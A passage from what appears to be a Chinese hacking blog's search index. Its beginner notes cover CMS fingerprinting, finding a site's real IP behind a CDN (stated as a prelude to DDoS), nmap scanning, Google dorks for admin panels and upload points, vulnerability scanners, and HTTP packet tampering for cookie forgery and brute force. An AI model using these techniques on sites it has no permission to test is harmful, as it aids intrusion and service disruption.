,dedecms（织梦）,wordpress,phpcms,jeecms,joomla,动易， 查看robots.txt 网页图标 主页最下面的一栏信息 通过站长工具的Whois或者zoomeye.org… 后台模板 工具（椰树，m7lrv） 作用：方便上网查询相关CMS漏洞、后台位置、默认密码等","tags":[]},{"title":"信息收集之真实IP查询","date":"2017-04-08T08:40:20.963Z","path":"2017/04/08/信息探测之真实IP查询/","text":"ping (ping带WWW、和ping不带www) （不一样则存在CDN） 采集二级域名（子域名）（URL采集工具）URL采集(子域名挖掘)→域名批量查询（http://ip.chinaz.com/ipbatch）→找非节点（CDN）IP→ 查看接受收的邮件，显示原文，看IP 基本上所有的大站都有一个段（C段），这个段可能会有几个系统，且ip很接近 通过威胁情报平台360: https://ti.360.com/#ThreatBook: https://x.threatbook.cn 查域名历史IP(在历史解析里面一般存在真实IP段)http://viewdns.info/iphistory/?domain=https://www.zoomeye.orgwww.shodan.io 全网扫描http://www.evil0x.com/posts/6547.html 查防护软件等信息（出现防护警告时）查看元素→网络→消息头→X-Safe-Firewall搜索 防护提示符 找真实IP的作用：运用DDOS攻击（分布式拒绝服务攻击）/直接尝试连接服务器配合DDOS作用：造成防火墙处理错误锁死、服务器瘫痪CDN作用：实时的根据网络流量和个节点的接连、负载情况以及用户的距离和相信时间将用户的请求重新导向离用户最近的服务器节点上。内容服务基于缓存服务器，也称为代理缓存。","tags":[]},{"title":"信息探测之nmap的使用（端口）","date":"2017-04-08T08:40:20.962Z","path":"2017/04/08/信息探测_端口篇/","text":"Nmap:可用于端口扫描/指纹识别/检测SQL注射/网页爬行/数据库密码检查等 Nmap参数的使用： -sT TCP连接扫描 （被扫描的系统会产生大量连接信息并写入日记） -sS 半开扫描 (即TCP SYN扫描) 很少系统把他写入系统日记 -sN/sF Fin数据包扫描 （即使SYN扫描都无法确定的情况下使用） -sP ping扫描 （测试一个段的主机存活IP） -sU UDP扫描 （因为不可靠，所以一般不用） -sA 穿过防火墙的规律集 -sV 探测端口服务版本 -P0 当被禁止Ping时可用此选项扫描 -v 显示扫描过程 -p 指定端口扫描（只扫描3389和80 -p “3389、80”） 利用方法：扫描www.baidu.com 的C段存活主机 Nmap –sP www.baidu.com/24 注：假如扫描为IP （222.332.186.121）， 应为 222.332.186.0/24 指定端口扫描： Nmap www.baidu.com(或填服务器IP) –p 80，3389，1433，（或1~X） 检查主机系统： Nmap –o www.baidu.com(或填服务器IP) 端口： 8080（Apache/Tomcat/Nginx/Axis2）, 21（控制端口）； 20（数据端口）；69（tftp小型文件传输协议）[FTP] 3306(MySQL数据库) 1433（Server 数据库服务）、1434（Monitor 数据库监控） (MSSQL数据库) 1521（数据库端口）、210（Oracle XDB FTP服务） (Oracle数据库) 25（smtp）、465（smtps）(SMTP协议) 53(DNS服务) 67&amp;68、546（DHCP服务） 22(SSH服务) 80/81/443(IIS服务) 7001(WebLogic) 1098/1099/4444/4445/8080/8009/8083/8093(Jboss) 908*；第一个应用就是9080，第二个就是9081；控制台9090(Websphere)","tags":[]},{"title":"信息探测之谷歌黑客语法的使用","date":"2017-04-08T08:40:20.960Z","path":"2017/04/08/信息探测_谷歌语法/","text":"Google Hack:（大部分语法也可用于百度） 主要语法：Site：找到与指定网站有联系的URL。 （用于搜索子域名）Intext：正文存在关键字的网页 （搜索重要信息）Intitle：标题中存在关键字的网页 （搜索后台等具有关键字的URL）Inurl：url中存在关键字的网页 （寻找伪静态持有的网页类型）Filetype:指定文件类型Site和inurl区别：Site:把搜索范围限定在特定站点中Inurl:吧搜索范围限定在url链接中 多种组合能达到意想不到的效果：例如：查看后台：inurl:baidu.com intext:后台管理查看上传点:site:xx.com inurl:filesite:xx.com inurl:loadinurl:baidu.com Intitle:上传查看ASP语言的后台Intitle:后台管理 filetype:asp星云CMS系统inurl:Showservices.asp?id= inurl:showkbxx.asp?id=利用：1.假如攻击者拥有的一个0day漏洞，则可以用此语法配合0day指纹进行批量的入侵。2.寻找网页后台（admin/login）、敏感文件（robots.txt/db.mdb）、敏感路径（upload）","tags":[]},{"title":"漏洞扫描之工具使用篇","date":"2017-04-08T08:24:16.651Z","path":"2017/04/08/漏洞扫描之工具篇/","text":"常用工具：AWVS/Appscna/Netsparker工具的使用 AWVS功能：Tools（工具）Web scanner 网站漏洞扫描 Site Crawler 网站爬行 Target Finder 扫描自定网段，开放指定端口的服务器 Subdomain Scanner 子域名扫描 Blind SQL injection Sql盲注手工测试 HTTP Editor HTTP信息查看编辑 HTTP Sniffer HTTP监听嗅探 HTTP fuzzer HTTP模糊测试 Authentication Tester HTTP认证测试 Compare Results 对比两次Acunetix扫描结果 Web Servces（Web服务） Web Services Scanner 网站服务扫描 。。。。。。。。。。 网站服务手动分析 Configuration（配置） Application Settings 应用程序设置 Scan Settings 扫描设置 Scanning Profiles 配置所用扫描脚本 General（一般） 。。。。。。。。。。。。。。。。。（AWVS的相关信息，破解版略过） 步骤：点击New Scan后可傻瓜式点击Next… 注：当点击第二布Options时可选择扫描类型 （没有针对性的话一般使用Default） 注：当点击Target时可查看网页服务器的类型 扫描结果： Site Crawler 的利用：输入URL，啪啪啪啪啪啪啪，就出来一堆“能看到的URL”了。 爬行小工具还有：burp suit/….网段端口扫描工具：nmap（windows版应该是Znmap）子域名查询：一般网页就有（搜索子域名查询）SQL盲注等注入：SQLMAP（带有过狗过防火墙的脚本，贼强）有关数据包的（HTTP协议包）：直接burp suit工具软件抓包：Wireshark工具 Netsparker：方法一样，Start New Scan ，输入URL，自动扫描漏洞。","tags":[]},{"title":"HTTP协议","date":"2017-04-08T04:38:10.917Z","path":"2017/04/08/HTTP协议/","text":"HTTP协议（超文本传输协议）： URL：网页地址。例：http://www.xxx.com/abc/bcd.html http://www.xxx.com/index.asp http://www.xxx.com 等都是URL。 HTTP遵循：请求（request）、相应（respsonse） 两部分 http请求（request）： 当发送请求包，自然也有响应包：http响应： HTTP请求方式：Get、Post、Put、Delete、trace、等常见如下：Get：用于短内容和不用保密的信息Post：用于传输长内容或需保密的信息。 危险请求方式：PUT：危险请求方式，用于请求服务器把请求的实体储存在请求资源下。如果资源存在，则替换服务器的原先数据。（用抓包工具利用）Delete：请求方式可改成删除指定资源Trace：允许客户端了解数据链另一端的接受情况，并利用这些数据信息去做相关测试。…. 响应行重要状态码：200：请求成功，正常执行 302：网页发生跳转 （URL重定向） 401：未授权 403：服务器拒绝服务。 404：请求资源不存在 500：服务器内部错误。 http与https区别：https单纯的比http更安全而已。安全基础是SSL。即：http+SSL == https Http端口：80https端口：443 截取http协议包工具：burpsuit/Fiddler/ 利用截取的协议包，可进行任意的更改操作。从而达到相关测试的目的。例如：1．修改/伪造的Cookies值 从而达到登陆的目的 2．无限重放协议包，从而达到自动化暴力破解登陆账号的目的 3．修改请求的上传文件类型。从而绕过本地/远程白名单限制。 4．查看上传地址，从而获取上次文件的URL位置 5．简单获取服务器信息","tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"}]}]